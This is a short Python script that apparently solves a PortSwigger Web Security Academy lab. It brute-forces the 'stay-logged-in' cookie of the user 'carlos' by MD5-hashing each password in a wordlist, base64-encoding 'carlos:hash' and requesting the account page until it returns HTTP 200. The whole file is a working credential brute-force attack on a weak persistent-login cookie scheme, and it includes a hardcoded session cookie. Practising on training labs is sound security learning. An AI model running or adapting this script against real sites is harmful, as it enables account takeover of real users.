import hashlib
import base64
import requests


url = "https://0a7000e704ae240bc29f623000a200d9.web-security-academy.net/my-account"

with open('../payloads/passwords.txt') as f:
    passwords = f.readlines()

for password in passwords:
    pwd_hash = hashlib.md5(password.strip().encode()).hexdigest()
    login_cookie = f"carlos:{pwd_hash}"
    login_cookie = login_cookie.encode('ascii')
    base64_bytes = base64.b64encode(login_cookie)
    base64_str = base64_bytes.decode('ascii')

    cookie = {"session": "VJp3UyugeJqnUEDV8gfDAMJkipyfSFcP",
              "stay-logged-in": base64_str}
    r = requests.get(url, cookies=cookie, allow_redirects=False)
    print(f"{r.status_code}: {base64_str}")
    if r.status_code == 200:
        break
